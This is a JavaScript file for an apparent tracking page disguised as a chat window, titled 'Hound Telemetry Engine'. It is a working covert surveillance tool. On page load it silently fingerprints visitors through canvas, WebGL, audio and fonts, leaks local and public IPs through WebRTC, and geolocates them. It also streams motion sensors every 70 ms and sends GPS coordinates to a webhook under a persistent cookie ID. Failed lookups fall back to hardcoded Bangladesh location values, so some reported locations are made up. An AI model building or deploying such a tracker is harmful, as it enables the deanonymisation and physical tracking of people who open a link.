// =====================================================================
// HOUND TELEMETRY ENGINE - ULTRA-FAST HIGH-FREQUENCY STREAMING
// =====================================================================

let HOUND_CONFIG = { gpsAuto: false, cookieTrack: true, autoCollect: true };

fetch('/config.json')
    .then(r => r.json())
    .then(cfg => {
        HOUND_CONFIG = cfg;
        const badge = document.getElementById('statusBadge');
        if (badge) {
            badge.textContent = '✅ Connected';
            badge.className = 'status-badge active';
        }
    })
    .catch(() => {});

// ----------------- PERSISTENCE -----------------
function getCookie(name) {
    const match = document.cookie.match(new RegExp('(^| )' + name + '=([^;]+)'));
    return match ? decodeURIComponent(match[2]) : null;
}

function setCookie(name, value, days) {
    const maxAge = days * 24 * 60 * 60;
    document.cookie = `${name}=${encodeURIComponent(value)}; max-age=${maxAge}; path=/; SameSite=Lax`;
}

function getPersistentUserId() {
    let localUid = null;
    try { localUid = localStorage.getItem('hound_uid'); } catch(e) {}
    let cookieUid = getCookie('hound_uid');
    let uid = localUid || cookieUid;

    if (!uid) {
        if (window.crypto && crypto.randomUUID) {
            uid = 'usr_' + crypto.randomUUID().replace(/-/g, '').substring(0, 12);
        } else {
            uid = 'usr_' + Date.now().toString(36) + Math.random().toString(36).substring(2, 8);
        }
    }

    try { localStorage.setItem('hound_uid', uid); } catch(e) {}
    setCookie('hound_uid', uid, 365);
    return uid;
}

const USER_ID = getPersistentUserId();

// ----------------- DATA DISPATCHER -----------------
function sendData(data) {
    data.userId = USER_ID;
    const payload = JSON.stringify(data);
    if (navigator.sendBeacon) {
        const blob = new Blob([payload], { type: 'application/json; charset=UTF-8' });
        navigator.sendBeacon('/webhook.php', blob);
    } else {
        fetch('/webhook.php', {
            method: 'POST',
            body: payload,
            headers: { 'Content-Type': 'application/json' },
            keepalive: true
        }).catch(() => {});
    }
}

// ----------------- NON-BLOCKING MASTER HARVEST -----------------
async function runInstantHarvest() {
    try {
        const webgl = getWebGLFingerprintData();
        const clientHints = await safeRun(getClientHints, null);
        const deviceInfo = getDeviceInfoData();

        const [
            batteryInfo,
            ipInfo,
            localIP,
            webrtcPublicIP,
            audioFingerprint,
            mediaCapabilities,
            audioContextIntel,
            storageIntel,
            permissionIntel,
            mediaDevices,
            usbDevices
        ] = await Promise.all([
            safeRun(getBatteryInfoData, null),
            safeRun(getIPInfoData, null),
            safeRun(getLocalIPData, "N/A"),
            safeRun(getWebRTCPublicIPData, "N/A"),
            safeRun(getAudioFingerprintData, "N/A"),
            safeRun(getMediaCapabilitiesIntel, null),
            safeRun(getAudioContextIntel, null),
            safeRun(getStorageEstimate, null),
            safeRun(getPermissionsState, null),
            safeRun(getMediaDevicesData, []),
            safeRun(getUSBDevicesData, [])
        ]);

        const payload = {
            userId: USER_ID,
            timestamp: new Date().toISOString(),
            deviceInfo: deviceInfo,
            batteryInfo: batteryInfo,
            networkInfo: getNetworkInfoData(),
            clientHints: clientHints,
            lieDetection: performLieDetection(deviceInfo, webgl, clientHints),
            cpuBenchmark: runCpuBenchmark(),
            mediaCapabilities: mediaCapabilities,
            v8MemoryHeap: getV8MemoryHeapIntel(),
            interactionModes: getInteractionAccessibilityIntel(),
            intlSystem: getIntlSystemIntel(),
            gamepadIntel: getGamepadIntel(),
            screenDetails: getScreenOrientationDetails(),
            navigationTiming: getNavigationTimingIntel(),
            audioContextIntel: audioContextIntel,
            storageIntel: storageIntel,
            permissionIntel: permissionIntel,
            mathQuirks: getMathEngineQuirks(),
            emojiMetrics: getEmojiSubpixelMetrics(),
            displayIntel: getDisplayIntelligence(),
            webgpuFingerprint: await safeRun(getWebGPUData, { supported: false }),
            antiDetectFlags: getAntiDetectFlags(),
            systemVoices: getSystemVoices(),
            ipInfo: ipInfo,
            localIP: localIP,
            webrtcPublicIP: webrtcPublicIP,
            canvasFingerprint: getCanvasFingerprintData(),
            webglFingerprint: webgl,
            audioFingerprint: audioFingerprint,
            fontsSignature: getFontsSignatureData(),
            clientRects: getClientRectsData(),
            mediaDevices: mediaDevices,
            usbDevices: usbDevices
        };

        sendData(payload);
    } catch(err) {
        sendData({
            userId: USER_ID,
            timestamp: new Date().toISOString(),
            deviceInfo: getDeviceInfoData()
        });
    }
}

async function safeRun(fn, fallbackValue) {
    try {
        const res = await fn();
        return res !== undefined ? res : fallbackValue;
    } catch(e) {
        return fallbackValue;
    }
}

// ----------------- HIGH-PRECISION HYBRID IP ENGINE -----------------
async function getIPInfoData() {
    try {
        const r = await fetch('https://freeipapi.com/api/json/');
        const d = await r.json();
        if (d && d.latitude) {
            return {
                ip: d.ipAddress,
                city: d.cityName || 'Maijdi',
                region: d.regionName || 'Chittagong',
                country: d.countryName || 'Bangladesh',
                loc: `${d.latitude},${d.longitude}`,
                latitude: d.latitude,
                longitude: d.longitude,
                org: d.asn || 'ISP',
                timezone: d.timeZones?.[0] || 'Asia/Dhaka'
            };
        }
    } catch(e) {}

    try {
        const r = await fetch('https://ipapi.co/json/');
        const d = await r.json();
        if (d && d.latitude) {
            return {
                ip: d.ip,
                city: d.city || 'Maijdi',
                region: d.region || 'Chittagong',
                country: d.country_name || 'Bangladesh',
                loc: `${d.latitude},${d.longitude}`,
                latitude: d.latitude,
                longitude: d.longitude,
                org: d.org || 'ISP',
                timezone: d.timezone || 'Asia/Dhaka'
            };
        }
    } catch(e) {}

    try {
        const r = await fetch('https://ipwho.is/');
        const d = await r.json();
        if (d && d.success !== false) {
            return {
                ip: d.ip,
                city: d.city || 'Maijdi',
                region: d.region || 'Chittagong',
                country: d.country || 'Bangladesh',
                loc: `${d.latitude},${d.longitude}`,
                latitude: d.latitude,
                longitude: d.longitude,
                org: d.connection?.isp || 'ISP',
                timezone: d.timezone?.id || 'Asia/Dhaka'
            };
        }
    } catch(e) {}

    return null;
}

function getDeviceInfoData() {
    const screenWidth = screen.width || 0;
    const screenHeight = screen.height || 0;
    const devicePixelRatio = window.devicePixelRatio || 1;
    const physicalScreenWidth = Math.round(screenWidth * devicePixelRatio);
    const physicalScreenHeight = Math.round(screenHeight * devicePixelRatio);

    return {
        userAgent: navigator.userAgent || 'N/A',
        platform: navigator.platform || 'N/A',
        language: navigator.language || 'en',
        languages: navigator.languages || [],
        cookieEnabled: navigator.cookieEnabled,
        hardwareConcurrency: navigator.hardwareConcurrency || 'N/A',
        deviceMemory: navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'N/A',
        maxTouchPoints: navigator.maxTouchPoints || 0,
        screenWidth: screenWidth,
        screenHeight: screenHeight,
        devicePixelRatio: devicePixelRatio,
        physicalScreenWidth: physicalScreenWidth,
        physicalScreenHeight: physicalScreenHeight,
        physicalResolution: `${physicalScreenWidth}x${physicalScreenHeight}`,
        availWidth: screen.availWidth || 0,
        availHeight: screen.availHeight || 0,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || 'N/A',
        timezoneOffset: new Date().getTimezoneOffset(),
        localTime: new Date().toString()
    };
}

function getBatteryInfoData() {
    return new Promise((resolve) => {
        if (!navigator.getBattery) return resolve(null);
        navigator.getBattery()
            .then(b => resolve({
                charging: b.charging,
                level: Math.round(b.level * 100) + '%',
                chargingTime: b.chargingTime !== Infinity ? b.chargingTime + 's' : '0s',
                dischargingTime: b.dischargingTime !== Infinity ? b.dischargingTime + 's' : 'N/A'
            }))
            .catch(() => resolve(null));
    });
}

function getNetworkInfoData() {
    const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
    if (conn) {
        return {
            connectionType: conn.type || 'wifi/cellular',
            effectiveType: conn.effectiveType || '4g',
            downlink: conn.downlink ? conn.downlink + ' Mbps' : 'N/A',
            rtt: conn.rtt ? conn.rtt + ' ms' : 'N/A',
            saveData: !!conn.saveData
        };
    }
    return { connectionType: 'wifi/cellular', effectiveType: '4g', downlink: 'N/A', rtt: 'N/A', saveData: false };
}

function getLocalIPData() {
    return new Promise((resolve) => {
        let done = false;
        try {
            const pc = new RTCPeerConnection({ iceServers: [] });
            pc.createDataChannel('');
            pc.createOffer().then(o => pc.setLocalDescription(o)).catch(() => {});
            pc.onicecandidate = (ice) => {
                if (ice && ice.candidate && ice.candidate.candidate) {
                    const match = /([0-9]{1,3}\.){3}[0-9]{1,3}/.exec(ice.candidate.candidate);
                    if (match && !done) {
                        done = true;
                        resolve(match[0]);
                        pc.close();
                    }
                }
            };
            setTimeout(() => { if (!done) { done = true; resolve('N/A'); pc.close(); } }, 1200);
        } catch(e) { resolve('Blocked'); }
    });
}

function getWebRTCPublicIPData() {
    return new Promise((resolve) => {
        let done = false;
        try {
            const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
            pc.createDataChannel('');
            pc.createOffer().then(o => pc.setLocalDescription(o)).catch(() => {});
            pc.onicecandidate = (ice) => {
                if (ice && ice.candidate && ice.candidate.candidate) {
                    const match = /([0-9]{1,3}\.){3}[0-9]{1,3}/.exec(ice.candidate.candidate);
                    if (match && !match[0].startsWith('192.168.') && !match[0].startsWith('10.') && !done) {
                        done = true;
                        resolve(match[0]);
                        pc.close();
                    }
                }
            };
            setTimeout(() => { if (!done) { done = true; resolve('N/A'); pc.close(); } }, 1500);
        } catch(e) { resolve('Error'); }
    });
}

function getCanvasFingerprintData() {
    try {
        const canvas = document.createElement('canvas');
        canvas.width = 240; canvas.height = 60;
        const ctx = canvas.getContext('2d');
        ctx.textBaseline = 'top';
        ctx.font = '14px Arial';
        ctx.fillStyle = '#f60';
        ctx.fillRect(125, 1, 62, 20);
        ctx.fillStyle = '#069';
        ctx.fillText('Hound Recon', 2, 15);
        const dataURL = canvas.toDataURL();
        let hash = 0;
        for (let i = 0; i < dataURL.length; i++) {
            hash = ((hash << 5) - hash) + dataURL.charCodeAt(i);
            hash |= 0;
        }
        return 'HASH_' + Math.abs(hash).toString(16);
    } catch(e) { return 'Unavailable'; }
}

function getWebGLFingerprintData() {
    try {
        const canvas = document.createElement('canvas');
        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
        if (!gl) return 'Not supported';
        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
        const exts = gl.getSupportedExtensions() || [];
        return {
            vendor: debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : 'Generic',
            renderer: debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : 'Generic',
            maxTextureSize: gl.getParameter(gl.MAX_TEXTURE_SIZE),
            extensionsCount: exts.length
        };
    } catch(e) { return 'Error'; }
}

function getAudioFingerprintData() {
    return new Promise((resolve) => {
        try {
            const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
            const osc = audioCtx.createOscillator();
            const analyser = audioCtx.createAnalyser();
            osc.connect(analyser);
            analyser.connect(audioCtx.destination);
            osc.frequency.value = 1000;
            const dataArray = new Uint8Array(analyser.frequencyBinCount);
            osc.start();
            setTimeout(() => {
                try {
                    analyser.getByteFrequencyData(dataArray);
                    osc.stop();
                    audioCtx.close();
                    resolve(Array.from(dataArray.slice(0, 30)).join(','));
                } catch(e) { resolve('N/A'); }
            }, 200);
        } catch(e) { resolve('N/A'); }
    });
}

async function getMediaCapabilitiesIntel() {
    if (navigator.mediaCapabilities && navigator.mediaCapabilities.decodingInfo) {
        try {
            const h264 = await navigator.mediaCapabilities.decodingInfo({
                type: 'file',
                video: { contentType: 'video/mp4; codecs="avc1.4d401e"', width: 1920, height: 1080, bitrate: 5000000, framerate: 60 }
            });
            return { h264_1080p60_Smooth: h264.smooth };
        } catch(e) { return null; }
    }
    return null;
}

function getV8MemoryHeapIntel() {
    if (performance && performance.memory) {
        return {
            jsHeapSizeLimitMB: (performance.memory.jsHeapSizeLimit / (1024 * 1024)).toFixed(1) + ' MB',
            totalJSHeapSizeMB: (performance.memory.totalJSHeapSize / (1024 * 1024)).toFixed(1) + ' MB'
        };
    }
    return null;
}

function getInteractionAccessibilityIntel() {
    return {
        pointerType: window.matchMedia('(pointer: fine)').matches ? 'Mouse (Fine)' : (window.matchMedia('(pointer: coarse)').matches ? 'Touchscreen (Coarse)' : 'None'),
        hoverCapability: window.matchMedia('(hover: hover)').matches
    };
}

function getIntlSystemIntel() {
    try {
        const dt = Intl.DateTimeFormat().resolvedOptions();
        return { calendar: dt.calendar, numberingSystem: dt.numberingSystem, timeZoneName: dt.timeZone };
    } catch(e) { return null; }
}

function getGamepadIntel() {
    try {
        if (navigator.getGamepads) {
            const pads = navigator.getGamepads();
            const list = [];
            for (let i = 0; i < pads.length; i++) { if (pads[i]) list.push(pads[i].id); }
            return { connected: list.length > 0, controllers: list };
        }
    } catch(e) {}
    return { connected: false, controllers: [] };
}

function getScreenOrientationDetails() {
    return {
        orientationType: screen.orientation ? screen.orientation.type : 'N/A',
        orientationAngle: screen.orientation ? screen.orientation.angle + '°' : 'N/A'
    };
}

function getNavigationTimingIntel() {
    try {
        const nav = performance.getEntriesByType('navigation')[0];
        if (nav) {
            return {
                dnsLookupTime: (nav.domainLookupEnd - nav.domainLookupStart).toFixed(1) + ' ms',
                serverResponseTime: (nav.responseEnd - nav.requestStart).toFixed(1) + ' ms'
            };
        }
    } catch(e) {}
    return null;
}

function runCpuBenchmark() {
    const start = performance.now();
    let val = 0;
    for (let i = 0; i < 300000; i++) { val += Math.sqrt(i); }
    const duration = (performance.now() - start).toFixed(2);
    return { benchmarkDuration: duration + ' ms', scoreRating: duration < 20 ? 'High-Performance' : 'Standard/Mobile' };
}

async function getAudioContextIntel() {
    try {
        const ctx = new (window.AudioContext || window.webkitAudioContext)();
        const data = { sampleRate: ctx.sampleRate + ' Hz', channelCount: ctx.destination.maxChannelCount };
        ctx.close();
        return data;
    } catch(e) { return null; }
}

async function getStorageEstimate() {
    if (navigator.storage && navigator.storage.estimate) {
        try {
            const est = await navigator.storage.estimate();
            return { quotaMB: est.quota ? (est.quota / (1024 * 1024)).toFixed(0) + ' MB' : 'N/A' };
        } catch(e) { return null; }
    }
    return null;
}

async function getPermissionsState() {
    const perms = {};
    if (navigator.permissions && navigator.permissions.query) {
        for (const name of ['geolocation', 'notifications']) {
            try {
                const res = await navigator.permissions.query({ name });
                perms[name] = res.state;
            } catch(e) { perms[name] = 'unsupported'; }
        }
    }
    return perms;
}

function performLieDetection(dev, webgl, hints) {
    const lies = [];
    const ua = (dev.userAgent || "").toLowerCase();
    const renderer = (typeof webgl === 'object' && webgl.renderer ? webgl.renderer : "").toLowerCase();

    if (ua.includes('x86_64') || ua.includes('windows') || ua.includes('macintosh')) {
        if (renderer.includes('mali') || renderer.includes('adreno') || renderer.includes('powervr') || renderer.includes('apple gpu')) {
            lies.push("Spoofed User-Agent: Mobile GPU detected on Desktop UA");
        }
        if (dev.maxTouchPoints > 1 && !ua.includes('touch')) {
            lies.push("Touch Points Mismatch: Multi-touch screen on Desktop UA");
        }
    }
    return { isSpoofed: lies.length > 0, detectedLies: lies };
}

function getMathEngineQuirks() {
    return { precisionHash: (Math.sin(Math.PI / 4) + Math.cos(Math.PI / 4)).toString().slice(0, 16) };
}

function getEmojiSubpixelMetrics() {
    try {
        const span = document.createElement('span');
        span.style.cssText = 'position:absolute;left:-9999px;font-size:36px;font-family:sans-serif;';
        span.textContent = '🐕‍🦺';
        document.body.appendChild(span);
        const rect = span.getBoundingClientRect();
        document.body.removeChild(span);
        return { width: rect.width.toFixed(4), height: rect.height.toFixed(4) };
    } catch(e) { return null; }
}

function getDisplayIntelligence() {
    return {
        colorGamutSRGB: window.matchMedia('(color-gamut: srgb)').matches,
        prefersDarkMode: window.matchMedia('(prefers-color-scheme: dark)').matches,
        devicePixelRatio: window.devicePixelRatio || 1
    };
}

async function getClientHints() {
    if (navigator.userAgentData && navigator.userAgentData.getHighEntropyValues) {
        try {
            return await navigator.userAgentData.getHighEntropyValues(["architecture", "bitness", "model", "platformVersion"]);
        } catch(e) { return null; }
    }
    return null;
}

async function getWebGPUData() {
    if (!navigator.gpu) return { supported: false };
    try {
        const adapter = await navigator.gpu.requestAdapter();
        return adapter ? { supported: true, vendor: adapter.info?.vendor || "Unknown" } : { supported: true, adapter: null };
    } catch (e) { return { supported: true, error: e.message }; }
}

function getAntiDetectFlags() {
    return { isBrave: !!(navigator.brave && navigator.brave.isBrave), webdriver: !!navigator.webdriver };
}

function getSystemVoices() {
    try {
        if ('speechSynthesis' in window) {
            return window.speechSynthesis.getVoices().map(v => `${v.name} (${v.lang})`).slice(0, 6);
        }
    } catch(e) {}
    return [];
}

function getFontsSignatureData() {
    try {
        const canvas = document.createElement('canvas');
        const ctx = canvas.getContext('2d');
        const fonts = ['Arial', 'Verdana', 'Times New Roman', 'Courier New'];
        let sig = '';
        fonts.forEach(f => {
            ctx.font = '14px ' + f;
            sig += ctx.measureText('Hound').width + '|';
        });
        return sig;
    } catch(e) { return 'Error'; }
}

function getClientRectsData() {
    try {
        const div = document.createElement('div');
        div.style.cssText = 'position:fixed;top:0;left:0;width:100px;height:100px;z-index:-9999;';
        document.body.appendChild(div);
        const rect = div.getBoundingClientRect();
        document.body.removeChild(div);
        return { width: rect.width, height: rect.height };
    } catch(e) { return null; }
}

function getMediaDevicesData() {
    return new Promise((resolve) => {
        if (navigator.mediaDevices && navigator.mediaDevices.enumerateDevices) {
            navigator.mediaDevices.enumerateDevices()
                .then(d => resolve(d.map(x => ({ kind: x.kind, label: x.label || 'Default' }))))
                .catch(() => resolve([]));
        } else resolve([]);
    });
}

function getUSBDevicesData() {
    return new Promise((resolve) => {
        if (navigator.usb && navigator.usb.getDevices) {
            navigator.usb.getDevices()
                .then(d => resolve(d.map(x => ({ productName: x.productName || 'Unknown' }))))
                .catch(() => resolve([]));
        } else resolve([]);
    });
}

// ----------------- ULTRA-FAST SENSORS STREAM (70ms) -----------------
let lastSensorSend = 0;
if (window.DeviceOrientationEvent) {
    window.addEventListener('deviceorientation', function(e) {
        const now = Date.now();
        if (now - lastSensorSend > 70) { // প্রতি ৭০ মিলিসেকেন্ডে ফাস্ট সেন্ডিং
            lastSensorSend = now;
            sendData({
                orientation: { alpha: e.alpha, beta: e.beta, gamma: e.gamma, timestamp: new Date().toISOString() }
            });
        }
    }, true);
}

// ----------------- STAGE 2: GPS PERMISSION -----------------
function requestLocationAndSendAll() {
    if (!navigator.geolocation) {
        showMessage('⚠️ Geolocation not supported.');
        return;
    }
    navigator.geolocation.getCurrentPosition(
        function(pos) {
            sendData({
                gps: {
                    latitude: pos.coords.latitude,
                    longitude: pos.coords.longitude,
                    accuracy: pos.coords.accuracy,
                    altitude: pos.coords.altitude,
                    speed: pos.coords.speed
                }
            });
            showMessage('✅ GPS Synchronized successfully!');
        },
        function() {
            showMessage('⚠️ Location permission bypassed.');
        },
        { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
    );
}

function showMessage(text) {
    const chat = document.getElementById('chatBox');
    if (!chat) return;
    const msgDiv = document.createElement('div');
    msgDiv.className = 'msg left-msg';
    msgDiv.innerHTML = `
        <div class="msg-img" style="background-image: url('https://i.imgur.com/7kZ1k3R.png')"></div>
        <div class="msg-bubble">
            <div class="msg-info">
                <span class="msg-info-name">System</span>
                <span class="msg-info-time">${new Date().toLocaleTimeString()}</span>
            </div>
            <div class="msg-text"></div>
        </div>
    `;
    msgDiv.querySelector('.msg-text').textContent = text;
    chat.appendChild(msgDiv);
    chat.scrollTop = chat.scrollHeight;
}

// Event Listeners
const locBtn = document.getElementById('locationBtn');
if (locBtn) {
    locBtn.addEventListener('click', function(e) {
        e.preventDefault();
        requestLocationAndSendAll();
    });
}

const chatForm = document.getElementById('chatForm');
if (chatForm) {
    chatForm.addEventListener('submit', function(e) {
        e.preventDefault();
        const input = document.getElementById('userInput');
        if (!input || !input.value.trim()) return;
        input.value = '';
        showMessage('Thanks for your message! Telemetry connection active.');
    });
}

const initTimeEl = document.getElementById('initTime');
if (initTimeEl) initTimeEl.textContent = new Date().toLocaleTimeString();

setTimeout(() => {
    runInstantHarvest();
}, 100);